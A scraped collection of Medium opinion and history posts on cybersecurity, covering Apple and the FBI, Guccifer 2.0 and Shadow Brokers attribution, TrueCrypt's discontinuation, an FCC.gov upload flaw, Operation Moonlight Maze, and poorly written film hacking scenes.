Well, no, they don’t. Most HR personnel and recruiters I deal with, have little to no clue between an experienced professional and a Cyber Cyber person. What we’re ending up is paying oodles of cash to people who have little to no practical experience, very basic technical training that may end up causing damage to the organization they serve.
In an industry that misses (according to some numbers I’ve read) hundreds of
thousands of good people, we cannot afford moving from honorable, experienced, honest and underpaid Porn-Seekers, into a generation of overpaid, inexperienced, Beats headphones using Cyber Cybers.
The world of security cannot end up in the hands of Beats headphones wearing Cyber-Cybers.
(Post script: the most depressing thing about this post is that I’m going to use the tag “Cyber” when publishing it. Otherwise no one will ever read it. Sheesh).
Written by
","['Cybersecurity', 'Information Security', 'Beats']"
The Dystopic Present Where Consumers Protest For The Rights of Corporations.,https://medium.com/@ryder_ripps/the-dystopic-present-where-consumers-protest-for-the-rights-of-corporations-e4f6b22af1a3?source=tag_archive---------8-----------------------,"The FBI, who once suggested that everyone encrypt their data, now wants Apple to grant them access to a terrorist’s iPhone.. a story you have seen everywhere by now. More alarming to me than the fact that members of the Islamic State buy Apple products, was that the homie Ed Snowden was like down with Apple’s “Customer Letter” to the FBI.
I retweeted this in support of the omniscient Jedi Snowden as I agree, citizens should not rely on Apple (or any other corporation) to defend their rights. Is that what is really going on though? This morning I learned that people were staging GLOBAL protests at Apple Stores in support of Apple’s US government dissent against breaking their phone’s encryption. While I would join this protest, I wouldn’t do it outside of an Apple store, as this this is clearly a marketing ploy. Why does such a thing have to be public? If the FBI asked Apple privately to break into a murderous asshole’s phone, Apple could have politely told them to go fuck themselves or could have helped them with installing software on that SPECIFIC PHONE in order to allow a brute force robot to try every possible passcode. This is what most people fail to realize, this has nothing to do with altering all iPhone software so the government and in turn nefarious hackers have access.. Apple was asked to help with this single device. Apple could have taken the device into their possession in private used the brute force method, and sent the FBI a non-encrypted disk image of the contents of the phone — but instead they decide to make this a public issue. Lets consider some facts before assuming Apple has the people’s interest in mind with their dissent –
We may collect, use, transfer, and disclose non-personal information for any purpose.
As is true of most internet services, we gather some information automatically and store it in log files. This information includes Internet Protocol (IP) addresses, browser type and language, Internet service provider (ISP), referring and exit websites and applications, operating system, date/time stamp, and clickstream data.
In summary, Apple is already spying on you and has permitted the government to do so in the past.
Perhaps their privacy rights protest marketing tactic has something to do with the fact that Apple’s iPhone sales have dramatically dropped???
Corporations are not your friend. Apple has twice as much cash than the US government. I think we should step back and consider what they really want, which has never changed. Behind their marketing slogans celebrating individualism, asking us to “Think Different” they are like any other company, they want your money and adoration. Don’t be fooled by the protest signs being sold at Apple Stores with slogans penned by TBWA/Media Arts Lab.
Written by
","['Privacy Policy', 'suicides', 'protests', 'Many', 'apps', 'promote', 'Cybersecurity', 'Apple', 'Snowden']"
The Evidence Guccifer 2.0 is Russian Intel - thaddeus t. grugq - Medium,https://medium.com/@thegrugq/evidence-guccifer-2-0-is-russian-intel-55f9f8b3f135?source=tag_archive---------1-----------------------,"On October 7th 2016 the US Intelligence Community made a strong statement attributing hacks, leaks, and various attribution fronts where the actions of Russian intelligence. They stated that the purpose of the hacks was to collect data, and the purpose of the leaks is to influence the US election.
The U.S. Intelligence Community (USIC) is confident that the Russian Government directed the recent compromises of e-mails from US persons and institutions, including from US political organizations. The recent disclosures of alleged hacked e-mails on sites like DCLeaks.com and WikiLeaks and by the Guccifer 2.0 online persona are consistent with the methods and motivations of Russian-directed efforts. These thefts and disclosures are intended to interfere with the US election process. — Source
A number of people have complained about the lack of US IC evidence to support this claim. The US IC does not make public attribution claims lightly. This is only the fourth time they have done so. The do not accuse nuclear powers of interfering in the general election because of what they read in the morning horoscope. It is a safe assumption that there is evidence that was used to back up this statement, even if we, the public, do not get to see it.
Fortunately, though, there is a large amount of public data and evidence which does provide weight to back up the ODNI statement.
There is plenty of open source intelligence available which shows that there is sufficient evidence to support the claim that Guccifer 2.0 is an attribution front for Russian intelligence services. One may examine the evidence and decide that it is not sufficient, but to ignore it, or state that it doesn’t exist, reveals more about the correspondent than the evidence.
Threat Connect shows the reuse of Russian infrastructure for the DCCC hack (from which data was stolen, altered, and then released by Guccifer 2.0.) ThreatConnect made a number of different posts linking Guccifer 2.0 to Russia:
And of course, there are the original CrowdStrike attribution of the DNC (and later DCCC) hacks to Russian APT groups:
There is a nice narrative structure fitting everything into a timeline, collecting evidence into a central location.
And Bruce Schneier put together a collection of links to data back in July.
There is a large volume of data all pointing the same way. The data is consistent, and there have been no plausible or viable alternative hypothesis that fits the available public facts. This makes for a fairly good case. One that is, at the very least, hard to ignore. Certainly one that cannot be dismissed as “without evidence.”
Written by
","['Infrastructure reuse', 'Cybersecurity', 'Operational Security', 'Guccifer2', 'Cyber']"
The Fall of TrueCrypt and Rise of VeraCrypt - ASecuritySite: When Bob Met Alice - Medium,https://medium.com/asecuritysite-when-bob-met-alice/the-fall-of-truecrypt-and-rise-of-veracrypt-44f910ed5162?source=tag_archive---------8-----------------------,"Today a paper was published that showcased problems with BitLocker, and where it was possible to comprise SSDs which use hardware encryption. The researchers recommended open sourced software, such as VeraCrypt (and which is based on TrueCrypt):
On 28 May 2014 2014 visitors to the TrueCrypt site found a message of:
For an open source project which supported a wide range of computer types and languages, it was a strange message to say that users should move to a closed-source and commercial solution. From a software solution that supports most types of modern computers, and is free to use, Bitlocker is part of Microsoft Windows, and which requires a licence for a version of Microsoft Windows that supports disk encryption.
Most encryption uses a secret encryption key, which is used to encrypt and also to decrypt. This is known as private-key encryption, and the most robust of these is AES (Advanced Encryption Standard). The key must be stored somewhere, and is typically placed in a digital certificate which is stored on the computer, and can be backed-up onto a USB device. The encryption key is normally generated by the user generating a password, which then generates the encryption key.
Along with this we need to provide the identity of user, and also that the data has not been changed. For this we use a hash signature, which allows for an almost unique code to be created for blocks of data. The hashing method used in TrueCrypt is SHA-512.
TrueCrypt is an open source disk cryptography package, which has been around since February 2004 and maintained by the TrueCrypt Foundation. It has versions for Microsoft Windows, OS X, Linux, and Android, and supports 30 languages. David Tesařík registered the TrueCrypt trademarking the US and Czech Republic, and Ondrej Tesarik registered the not-for-profit TrueCrypt company in the US. It works by created a virtual drive on a computer, and then anything which is written to the disk is encrypted, and then decrypted when the files are read back. For encryption it uses private key encryption with AES, Serpent, or Twofish (or combinations of these), and uses hash functions of RIPEMD-160, SHA-512, and Whirlpool. In modern systems, AES is seen to be the most secure, and SHA-512 provides state-of-the-art signatures. The encrypted drive does not have a magic number which identifies the presence of TrueCrypt, but forensic analysis can reveal a TrueCrypt boot loader, after which a hacker might try different passwords to unlock the drive.
Internally, with Version 7.1a, there had been an audit on the code, with an announcement on 28 May 2014 that there was a discontinuation of TrueCrypt, along with the release of version of 7.2 (which was intentionally crippled and contained lots of warnings in the code). The updated licence (TrueCrypt License v 3.1) contained the removal of a specific language that required attribution of TrueCrypt. Never in the history of software had there been such an abrupt end, and where the developers did not even want a fork of their code. A recent email from a TrueCrypt developer (on 16 June 2014) outlined that they did not want to change the license to an open source one, and that the code should not be forked.
Some reckon that there was an on-going code audit, and that an NSA-created backdoor was due to be found. Again, something that the smoke-screen was then put-up to move towards a closed-source alternative, which some reckon, also has an NSA-enabled backdoor. Few security professionals, especially those involved in the creation of encryption software, would have recommended the Microsoft technology.
The mystery remains about the code, but there are some strange pointers that give some clues. A strange one is that, with the code, “U.S.” has been changed to “United States”, which could point to an automated search and replace method of changing the code to reflect a possible change of ownership of the code.
The other strange thing about the post is that the page created for the re-directed looks as if it has been created by a complete amateur:
and even the Wayback engine was having trouble finding the pages from the past:
So was it a back door or could it have been a bug, in the same way that OpenSSL was exposed?
If there is a code bug, the light is likely to shine on one of the weak points in cryptography, which is the generation of a pseudo random number, which is almost impossible on a computer. One way of doing this is to randomly use the time between key strokes for users, but if an intruder can guess these, they can significantly reduce the range of numbers used for the cryptography process. This could have been the Achilles heel of the code, and that the audit process could have uncovered a flaw, which others could exploit. In the case of TrueCrypt the random number was generated by the user moving a cursor across the screen, and it could be this method which caused the problem.
Another possible problem focuses on the actual binary code produced. Even if the source code does not contain any bugs, it will be converted into machine code, which could expose problems which could be exploited. Overall, most users will generally download the binary distribution, as it is often too difficult to build the code from scratch. Thus there could have been an exploit within the binary distributions which could be compromised. Often developers forget that their code can be run within a debugger to view, and even edit, the code. With the code built for so many systems, it would have been almost impossible to make sure that the compiled code would be secure from being tampered with.
While the licence possibly prohibited a fork of the code, new groups, working outside the US, started to recreate the code in order to overcome the licencing issues. One of the most successful has been VeraCrypt:
Many see the encrypting of disks as the ultimate method of security, but, unfortunately, it suffers from many problems. These include:
Written by
","['Security', 'Cybersecurity']"
The FCC.gov Website Lets You Upload Malware Using Its Own Public API Key,https://medium.com/secjuice/the-fcc-gov-website-lets-you-upload-documents-and-host-them-there-bdcd5c1a5b8b?source=tag_archive---------0-----------------------,"Somewhat incredibly the FCC lets you upload any file to their website and make it publicly accessible using the FCC.gov domain. Or rather they don’t, but they have somehow not realized that they are letting people do it and telling them how in their own documentation.
Take a look at (UPDATE : The links no longer work, the FCC has disabled them.) this document about FCC Chairman Ajit Pai which has clearly not been put there by anyone who works at the FCC, neither has this one.
Those currently uploading files are able to do this using the FCC’s own public API, a key that they seem to send to anyone with any email address.
I am not going to tell you how and obviously I have never actually done this myself, but if you have enough of the right kind of technical experience the public FCC API documentation tells you all you need to know.
From what I can see happening on Twitter, people seem to be experimenting uploading different filetypes and so far they have managed pdf/gif/ELF/exe/mp4 files up to 25MB in size.
This means that you could easily host malware on the FCC.gov website and use it in phishing campaigns that link to malware on a .gov website.
So far those with the technical chops have discovered that you can upload video and play it back using an FCC.gov link, some have been having trouble uploading, while others playing with the vulnerability are clearly not.
Check out this funny FCC.gov hosted picture, it was the first image hosted but am not going to link to any others, because you can imagine.
This is clearly hugely embarassing for the FCC and even though they seem to have disabled public API use until they investigate further, I am told that their DEMO API works just fine still and all the content is still hosted.
We can’t have people uploading fake communications carrying an FCC letterhead and pretending they are real documents, the potential for fraudulent use is ridiculously high and this vulnerability is easily abused.
This story is so new that it hasn’t hit the mainstream tech media yet (Update: The Register, Gizmodo, Vice and Breitbart covered this story) and even though we only just publicly realized this vulnerability existed, who knows how long it has been abused by people who found it earlier?
**** UPDATE : Interview with OP ****
I have just finished interviewing the guy who sent that very first cuck PDF up onto the FCC website and he has asked me to keep his name confidential for now until we see how this story plays out tomorrow in the media.
I verified his account by checking the original PDF documents metadata and it was created long before the first mention of this story on the web, long before I first noticed others using the vulnerability and before I wrote this.
OP is legit and he stumbled across this vulnerability, he then stumbled across my story and reached out to me to talk, agreeing to go on record.
He did this because he knows that I protect my sources.
OP was commenting on the FCC.gov website just before midnight deadline and he realized that they assigned a URL to a file before posting a comment.
The “express” comment filing system that most people are using does not allow you to attach files and I was using the more ‘robust’ filing feature.
OP was upset about Net Neutrality and decided to create a document containing the now immortal sentence and upload it to the FCC.
OP is a 20yr student at university and was goofing off from his homework and he decided to have some fun, he saw it as a dumb joke and had no idea that things would get so out of hand, or that others would follow his lead.
He also did not think anyone would notice his PDF, otherwise he would have written the document in a more mature way he told me.
It’s also important to note that OP believes that he never agreed to the FCC.gov TOS because he never applied for an API key, he just managed to get the URL through their faulty comment system, no hacking involved.
This is absolutely true, the FCC don’t enforce their TOS anywhere, you can signup here and here without ever having to agree to a terms of service agreement of any kind, so OP seemingly didnt break their TOS.
OP is scared and a lot of you are making him really worried about this, so its worth noting that he did not actually hack anything to upload his PDF.
OP has already written to the EFF to ask for advice, he really does believe he is about to enter a world of pain for this, just as he is leaving university to begin his professional career and interviewing for jobs.
He thought that nobody would see it, so he took no privacy precautions.
I think we can all agree that OP was foolish, but fingers crossed nobody will harshly punish him for what is very obviously a flaw in the FCC website and a huge gaping hole in the FCC’s cybersecurity posture.
OP did us a favor and we are lucky that criminals didn't find it first.
Sponsor | Looking for a remote browser isolation solution? Check out WEBGAP, home of WEBGAP browser isolation and the WEBGAP remote browsing service.
Written by
","['Opinion', 'OSINT', 'How To', 'Tech', 'Technology', 'Cybersecurity', 'Hacking', 'Disclosure']"
The First Cyber Espionage Attacks: How Operation Moonlight Maze made history,https://medium.com/@chris_doman/the-first-sophistiated-cyber-attacks-how-operation-moonlight-maze-made-history-2adb12cc43f7?source=tag_archive---------2-----------------------,"Newly declassified documents shed light on the original cyber cold-case
Update: See the new details from Kaspersky
In September 1999 Newsweek broke the story that the United States was under a sustained cyber attack. They claimed that thousands of sensitive but unclassified documents relating to technologies with military applications had been stolen. Further reports at the time pointed the finger at the Russian government as a possible source of the attack, but details were limited.
Last Saturday Silas Cutler, a Senior Security Researcher at CrowdStrike and Project Director of MalShare, shared newly declassified documents that the FBI had on the case following a Freedom Of Information Act request. This coincides with the release of a book by Thomas Rid that cover the attacks from interviews with many of the people close to the case twenty years ago.
Initial Identification
In 1998 a technician at a specialist materials company “ATI-Corp” identified a connection from their network to Wright Patterson Air Force Base. He noticed the user was connecting at 3 AM on a Sunday, and the owner of the account confirmed that they weren’t using the account at that time. He raised the alarm to a number of CERTs (Computer Emergency Response Teams) - the Air Force were the first to respond.
They identified it was an attacker, and found they had made further connections to Wright Patterson Air Force Base from the University of South Carolina, Wright University and the University of Cincinnati. In one instance it appeared the attackers had made a mistake — they had connected (possibly directly) from a machine in Moscow.
As the FBI commenced an investigation, code named “Moonlight Maze”, it became clear that this wasn’t an isolated case. It was a coordinated attack on an unprecedented scale.
The Investigation
A team was stood up quickly, bringing together elements from law enforcement, defense and government.
The investigation widened as the attackers compromised important research institutions such as the Army, Los Alamos and Sandia national laboratories. The victims covered the United States, United Kingdom, Canada, Brazil and Germany.
By 1999 a Moonlight Maze working group was established, composing of forty specialists from Law Enforcement, Military and Government.
Universities
The investigators identified the attackers were proxying through University networks and small businesses. Universities and small businesses make excellent proxies for attacks — they may have fast network links to target systems and their traffic appears more legitimate than a connection from Moscow. They can also have valuable information of their own – despite their weak defenses.
The investigators installed the network equivalents of wire-taps at a number of the compromised universities that the attackers were moving through. Now they could watch the attackers as they typed out their commands. They discovered the attackers were using the standard tools (Telnet and FTP) to move through networks and steal documents without standing out.
London
Reviewing the connections from the Universities, the investigators identified an earlier hop-point in London, and looped in the local Met police force. The documents don’t describe this system in detail, but Rid has reconstructed the events from other sources. The attackers compromised a system “HR Test” at the Institute of Personnel and Development in London to store their tools and stolen documents.
The investigation didn’t all go to plan. Someone with an awareness of the investigation connected to the system in London without permission to obtain a copy of the hackers tools. The FBI requested a warrant and seized his home and work computers.
Other agencies
The investigators requested assistance of further teams with better access to the attackers communications — that could potentially help to track stolen documents and malicious commands as they transited to the attackers. Given the sensitive nature of this work, this is only described in passing within the redacted documents.
Setting the Trap
The documents show the investigators considered the possibility of creating a honeypot, to lure the attackers into a system designed to help identify information about them. This had proven to be a successful method in well-known attacks involving a German hacker called Markus Hess, who had stolen technologies to sell to the Soviet Union in the 1980s.
Rid describes a relatively simple method that the investigators used — a honey document they allowed the attackers to steal, that when opened initiated a DNS request back to a machine operated by the investigators. This provided the location of the machine the document was opened on.
A Russian nexus
Many of the documents are concerned with suspicions of who is behind the attacks. They note that the attackers didn’t work during Russian Orthodox holidays, and their working hours could align with a typical working day in Russia.
Some attacker connections were identified from dial-up modem accounts in Moscow. Whilst it’s possible the attackers proxied connections from elsewhere, it is less likely with a dial-up connection than with a server.
Public reports at the time referred to the Russian Academy of Sciences as being a possible source, and an encryption company reported an attack against it’s servers from a system in their network range. However there is no public information clearly linking the academy to the attacks.
Rid describes further findings. An Air Force investigator named Kevin Mandia, now the CEO of cyber-security juggernaut FireEye Mandiant, identified the Russian phrase for “child process” within one of the attackers tools. School children in many parts of the former USSR learn Russian — so this is not as strong an indicator as it may appear.
The visit to Moscow
The investigative team had no smoking gun— so they decided to go to Moscow itself to follow the leads they had. Rid records an incredible piece of luck for the investigators. The Russian Ministry of the Interior requested US assistance in identifying persons who had defamed Russian President Boris Yeltsin’s daughter. The FBI assisted as far as they were permitted, and asked for reciprocal help on Moonlight Maze- giving the Russians the impression it was a more standard criminal case.
Many of the documents record the logistics of sending members of the Moonlight Maze working group to Moscow. They don’t describe the outcome of these events however.
Just what happened on the Russian side isn’t clear. But both Rid’s account, and another by Fred Kaplan, describe a Russian General. At first he was happy to help the investigators, likely thinking it was a simple criminal case with no connections to his own government, but he soon disappeared and Russian assistance was withdrawn.
Aftermath
Many thousands of pages were stolen by the attackers from a number of sources. Whilst the information was unclassified, it aligned to controlled technologies with military applications.
The documents also record the reactions when, following an initial classified briefing to congress on the state of the investigation, the news leaked and Newsweek published an article on the story. The attackers continued their intrusions despite the attention, though soon became harder to track.
In a summary of the case during the investigation, the author of a document records one “non-US person” had been identified, as had one “piece of malicious code”. The documents don’t go into detail of what these are.
Rid suggests that whilst the attackers became more difficult to track there may be links, via the usage of Satellite infrastructure and programming code, to a modern group of attackers named Turla. Turla are best known for a 2008 compromise of classified Department of Defence networks, and continue to be a thorn in the side of many embassies and defense contractors.
The attacks aren’t the first cyber-attacks against the United States linked to a foreign state — those were the 1985 attacks by Markus Hess. And sophisticated English speaking attackers have been dated back to at-least 1996, coincidentally when some of the first Moonlight Maze attacks commenced.
But Moonlight Maze did mark the beginning of a new era of constant cyber-espionage. They were quickly followed by the Titan Rain attacks — allegedly this time of Chinese, not Russian, origins.
Thoughts? Questions? I’d love to hear them — I’m @chrisdoman on twitter
Many thanks to Thomas Lancaster, Michael Yip, Nina Dickinson, @instacyber and Richard Lewis for reviewing the article and suggesting edits prior to publication.
Written by
","['Cybersecurity', 'Security', 'Tech', 'Technology', 'Russia']"
The Great Cyber Game: Commentary (2) - thaddeus t. grugq - Medium,https://medium.com/@thegrugq/the-great-cyber-game-commentary-2-33c9b79ca8ac?source=tag_archive---------3-----------------------,"In the first part of this commentary I explained how this operation (Shadow Brokers dropping info), and the parallel operations (Fancy Bears hack team chasing media; the Cleetus account chasing media) are probably coordinated information operations to attempt to shift attention away from Russia’s election meddling.
This second part will look at the dense message that was sent to the NSA on December 14th by the Shadow Brokers. In retrospect, it is now clear that this unusually expensive message was actually laying the groundwork for the December 16th media press to shift the narrative. Very clever information operations work, but I expect nothing less from the Russians. They are grand masters at this game.
The game play so far started with an expensive signal to the NSA. Then a pivot to subverting the narrative and attempting to draw attention away from important issues (Russia meddling in the US elections) to trivial things (hacking news about doping in sports!) and conspiracy theories (is there a shadow war in the IC? No.)
The first move in this play was a very expensive message to NSA which revealed that FSB had (have?) access to “high side” (NSA’s classified networks) exclusive tools. This move established the credibility of the new cut out — Cleetus — what intelligence officials would call “establishing his bonafides”. It also contains a number of extremely densely packed messages targeting a wide range of audiences:
Here is the Medium post:
The ShadowBrokers drop used a freshly created cut out account, registered in December. There is a huge amount of clever references hidden in here, so we’ll unpack them all (I might miss some, this is quite dense.)
These guys are hilarious, but they also operate like an intelligence agency. They do deep research and build a deliverable information product that they believe will resonate with their target audience. Analyzing it is like semiotics and lit crit on steroids, with a deep background in cyber, geopolitics and you still have to spend a lot of time in Google.
Lets dive in and see what we find.
The name of the account that dropped the docs is a probably reference to Hank Williams Jr who’s nickname was Bocephus: “His father nicknamed him Bocephus (after Grand Ole Opry comedian Rod Brasfield’s ventriloquist dummy).” So, that is one “deep red country” reference.
This one is a bit more of a stretch, but I think it fits. One of the Deputies always chasing the Dukes around in the TV show “The Dukes of Hazzard” is Deputy Cletus Hogg. Cletus is one of the villains always charging the Dukes with trumped up charges and making their lives difficult. So, again, a “deep red country” reference.
Now here’s the punch line:
F-Secure named the Russian malware strains used by the Russian APT groups “the Dukes.”
That gets us past the name of the Twitter account. Now, their first post, which was a bit of a media flop. In retrospect, it is obvious that it was never pushed hard because the message was primarily targeted at NSA, and its secondary purpose is to provide credibility to the followup conspiracy theory message they are pushing hard.
On to unraveling the message.
“…this is for the people of the sun!” — Source
The opening line is a lyric from the RATM album “Evil Empire” and is from a song about Mexicans fighting back against the colonial oppressors.
That is some pretty clever messaging. There is “Evil Empire,” “Rage Against The Machine” and a theme of armed insurrection against oppressors. At the same time, it insinuates that there is an violent Mexican immigrant insurrection ready to happen at anytime inside the United States. Thats really a lot of messaging to put into just one line. It might not be the punchiest lede ever, but it could be a contender for “most compressed message.”
Well howdy partners! I don’t wanna be getting arrested for passing on fake news and all. I rekon I ain’t no security professional but I am whutcha might call a ZeroNet enthusiast. I figured y’all might enjoy something I found on the ole Zero Nets. Those dastardly ole shadow brokers have themselves a zite on ZeroNet. Yep and fars as I can tell they appears to be sellin NSA tools individually now. — Source
The over the top aping of the style of talking used in the Dukes of Hazzard is particularly why the Cletus reference seems to fit well. It is a nod and a wink that can be interpreted as appropriate by whichever audience is reading it. At the same time, it provides a great mask for any linguistic analysis because it is so clearly consciously created.
These guys have a great sense of humour.
For all intents and purposes, yes. This was the only account that published this data, and the “following” list is clearly intended as its own set of signals.
Incidentally, I suspect @musalbus is in there because he tweeted that NSA tools were being sold individually on the darknet. I don’t believe that was true at the time, and I suspect that he is included simply to add credibility from a third party about the dark web sale of individual NSA tools.
These guys do their research!
They have also quote his tweets in the past (when he did a load of research on the first Shadow Brokers drop in August.)
The bottom of the post asks people to donate to “The New American Empire” and includes a bitcoin wallet.
At least one person has done that, sending about $50 to the address, which was then promptly moved out a couple hours later. This is particularly curious as the transaction happened on November 23rd, at least two weeks before the Cleetus account was created and about three weeks before the post was made.
There are no other references to this wallet address except on blockchain.info, and in the Medium post.
Someone else who knows more about Bitcoin might want to follow that up, but I’m willing to speculate this is not a sincere plea for donations.
If we rule out soliciting money as the reason for the link, then the most logical conclusion is the reference to “The New American Empire,” summarised by Wikipedia as:
a geopolitical book by economist Rodrigue Tremblay that analyses the causes and consequences of the political shift taking place in U.S. foreign policy at the beginning of the 21st Century.
…
The New American Empire is divided into four parts, analyzing the strategic causes behind the 2003 Iraq War and its consequences: first, the role played by politics and religion; second, the role played by oil and military strategy; third, how the Bush Doctrine as a blueprint for U. S. world hegemony conflicts with international law; and, how the very long cycle of empires may be getting close to the end for the Western world.
I will admit to ignorance of this book before writing this post, but its inclusion certainly seems to be a message directed at an audience.
I’m deeply indebted to analysis and suggestions provided by [redacted], [redacted], [redacted] and everyone else who helped. (Let me know if you’d like me to unredact your name.)
How expensive was this message of messages? I’ll examine the contents of the zip and post in part three.
Written by
","['Security', 'Cybersecurity', 'Infosec', 'Shadowbrokers', 'Operational Security']"
The Great Cyber Game: Commentary (3) - thaddeus t. grugq - Medium,https://medium.com/@thegrugq/the-great-cyber-game-commentary-3-a1ae9a70e399?source=tag_archive---------4-----------------------,"In the first part of this commentary I looked at what and why the cyber full court press is happening. The second part was a textual analysis of the Shadow Brokers drop (matryoshka messaging.) This third part will explore how we know that this was such an expensive message.
This post will address two questions: was it really the shadow brokers, and are they really NSA tools from the high side?
This is an easy one. The first clue that this is the ShadowBrokers is the terrible wandering accent they affect. But the proof that it is really them is that the PGP signatures are correct. Full stop.
The major cost of this ShadowBrokers message was the information exposed by the drop. It reveals what the ShadowBrokers knew, which is precious information to an intelligence service. This particular dump reveals a lot, the most important of which is that ShadowBrokers had access to tools, implants and exploits that would only exist on the high side (inside the NSA’s classified networks.)
The easiest way to tell this is high side gear, not a back hack from an ops box is that there is simply too much here. Its hard for me to explain because it requires a level of information security knowledge combined with understanding how cyber operations are conducted (which is different from pen tests or red teaming.)
Cyber operations are basically designed with operational security in mind. The operators create a minimal package of tooling needed for conducting exactly, only and specifically the operation they are doing. This means, for example, if they are hitting a telco Call Data Records (CDR) box, they will plan for what they are going to do on that specific computer and prepare the tools for only that plan and that computer. If those tools are captured, or there is a back hack up to their staging point, the loss is compartmented. The operator will (should*) ensure that there are no codenames exposed, that everything is encrypted, and that there is as little evidence as possible for the opposition.
With that in mind, have a look at the summary of what is being offered for sale.
It contains code names, obvious hacking tools (forkpty), numerous exploits and implants, and at least one duplicate from the original ShadowBrokers release in August (nopen). The details inside the zip file are even more revealing. There is simply too much for any single failure / mistake (such as the first drop) to explain it.
This dump has a bit of everything. In fact, it has too much of everything. The first drop was a firewall ops kit. It had everything that was supposed to be used against firewalls. This dump, on the other hand, has too much diversity and each tool is comprehensive.
The depth and breadth of the tooling they reveal can only possibly be explained by:
To show the sort of breadth, here is the internal user control script (with the original naming) for a telco CDR data extraction tool:
And here is a set of hundreds of precompiled implants, in incrementing version numbers, for a set of target boxes. This is a comprehensive set, no other way of viewing it:
And they include the usage manual.
It is obvious that this data would never leave NSA classified networks except by some serious operator error (as I believe was the case with the first ShadowBrokers leak.) For this dump though, it is simply not plausible. There is no way that such diverse and comprehensive ops tooling was accidentally exposed. It beggars belief to think that any operator could be so careless that they’d expose this much tooling, on multiple diverse operations.
There are, based on my count, twenty one (21) scripts/manuals for operations contained in this dump. They cover too many operations for a mistake, and they are too comprehensive for a mistake.
If the sale was real and you bought the tools individually, you’d be paying about 1400 BTC (a bit under USD$ 1.1 million, at this hour’s exchange rate.) The entire dump for just 1000 BTC is a real bargain (only USD$780k), it pays to buy warez in bulk!
For the NSA this is definitely a gut punch. There is a lot of operational detail and lessons that are exposed in this (and the earlier Shadow Brokers dump). The upshot is that a lot of it looks pretty old. So this might be “of historic interest only.” I would expect that a lot of the tools and exploits here are no longer the state of the art for NSA, and so their ability to do their mission will not be negatively impacted by this release. Still, damn, that’s gotta hurt.
Earlier in this series: Part One. Part Two.
Written by
","['Cybersecurity', 'Surveillance', 'Infosec', 'Shadow Brokers', 'Operational Security']"
The Great Cyber Game: Commentary - thaddeus t. grugq - Medium,https://medium.com/@thegrugq/the-great-cyber-game-commentary-3f821f0db749?source=tag_archive---------5-----------------------,"Cyber is receiving a lot of attention these days, and I’m not sure quite know how to feel about it. Fortunately, very few people are capable of the deep analysis that these events require. This is my contribution to one of those camps, the deep analysis one I hope…
Major take away: FSB had access to NSA tools that could only come from inside NSA’s classified network. (See part two for details.)
That is explosive. A serious gut punch to the NSA that must have them scrambling to figure out what is going on. Timing is important here, the announcement was made just before President Obama’s last presser and in the middle of a huge flap about how the Americans handled Russia hacking their election (hint: very poorly.)
First of all, let me get this out of the way. This drop is huge in term of value and messaging. The Shadow Brokers are revealing that they have access to tooling and exploits that only exist inside the classified networks of the NSA. They literally just dropped “we had (have?) access to the High Side of NSA networks and we don’t care that you know.” Not a cheap piece of information to reveal.
That is massive. No intelligence agency drops that sort of information unless they are buying something more valuable with it. It was poorly picked up by the press partially because it wasn’t pushed hard, but also because it is hard to understand the significance of this signal unless you have “inside cyber” knowledge.
December 14, 2016: Cleetus Twitter account registered.
December 14, 2016: Medium post about SB tool sale published
December 16, 2016 (approx. 5am EST): Second medium post suggesting: (a) Russia never hacked anyone, (b) the election hacking story is a coverup for a CIA vs NSA shadow war.
December 16, 2016 (approx. 6am EST): The Cleetus Twitter account starts hammering news sites with the second post
December 16, 2016 (approx. 7am EST): Fancy Bears Hack Team (another Russian attribution front) increases their tempo of soliciting news coverage
First signs of something happening from the F****** Bears was from TFB’s Twitter:
And they also hit up Ars Technica: ”Hello, we are Fancy Bears’ Hack Team. Are you interested in WADA and USADA confidential documents?”
Update: I’ve been informed that a major UK publisher was also contacted for an exclusive WADA document dump.
Russian doctrine is generally about overwhelming the opposition. In Soviet Cold War intelligence games times this included things like sending multiple “dangles” at the same time in the hopes that some would get through (when instead the flood was a red flag.) Looking at the timeline I see an overwhelming attempt to get additional narratives into the news cycle (these all hit in the early morning in the US East coast) intended to bleed attention away from the current fixation on Russia’s cyber meddling with US elections.
Let me drop some knowledge on you guys: CIA and NSA don’t hate each other. They aren’t at war. CIA thinks the NSA is full of introverted autistic nerds. NSA thinks CIA is gung ho cowboys (covert ops) and pencil pushers (intelligence analysis). The both think the FBI is full of morons. The intelligence community (IC — all of the above agencies, and more) hate the State Department. But, again, they generally have this deeply patriotic streak that keeps them all on the same side when they face off against, say, Russia.
See you in part two for detailed analysis on the Shadow Brokers drop.
Written by
","['Cybersecurity', 'Operational Security', 'Shadow Brokers', 'Cyber']"
The Incredible Hack: Five of the worst on-screen hacking scenes,https://medium.com/threat-intel/worst-tv-film-hacking-5aa29a2742dc?source=tag_archive---------7-----------------------,"It seems like every film and TV show these days has some reference to hacking. After all, computers are a ubiquitous part of modern life. Some of us work all day on a computer then go home and play games on one, watch TV on one, have one strapped to our wrist, and also have one in our pocket that we use for communicating. So it follows that computers and, by association, hacking would be reflected in a good chunk of our on-screen entertainment. However, the problem isn’t in how much hacking is being shown on screen but in the quality of the writing and the lack of basic research (or even Googling for crying out loud!) done before this stuff gets filmed.
Sometimes hacking is a major part of the story but a lot of the time it’s used in the narrative as an easy way out, a crutch to support shoddy writing. Magic and time travel are also used in this way but the main difference between these and hacking is that over time hacking has entered the lives of regular people. You can’t get away with using it as this mysterious smoke and mirrors solution anymore. Every day there’s another breaking news story about a breach at a large corporation or some top secret government data being leaked to the press. People are more aware of what is and isn’t possible now and our technological literacy is improving all the time. Gone are the days when you could impress the audience by uploading 80 gigabytes of data into Keanu Reeves’ melon* because most people now know they can fit more than that onto their phone!
Now I don’t pretend to be an expert — the closest I get to hacking is discovering a new keyboard shortcut in Word — but I have actually used a computer which, by looking at some of these hacking scenes, is more than can be said of the people that produced them.
Some of the scenes in this list are so ridiculous that they actually made me wonder if they were in fact done as a joke…but more on that later.
So without further ado, let’s take a look at five of the worst offenders:
In at number five is Rat and his phreaking demo from the sci-fi disaster movie The Core. In a movie where a group of scientists drill to the center of the Earth to set off some nukes in order to start the planet’s core spinning again before the world tears itself apart, it says a lot when the most unbelievable plot point involves someone hacking a cell phone.
When our hero visits an über hacker named Rat to ask for help, the rodent-monikered computer whiz proves his worth by folding a chewing gum wrapper into a magical hacker-like shape and uses it to whistle into the protagonist’s cell phone. The result? Free long-distance calls for life. Obviously the scriptwriters were buddies with the cops that believed Kevin Mitnick was capable of starting World War 3 by whistling into a pay phone.
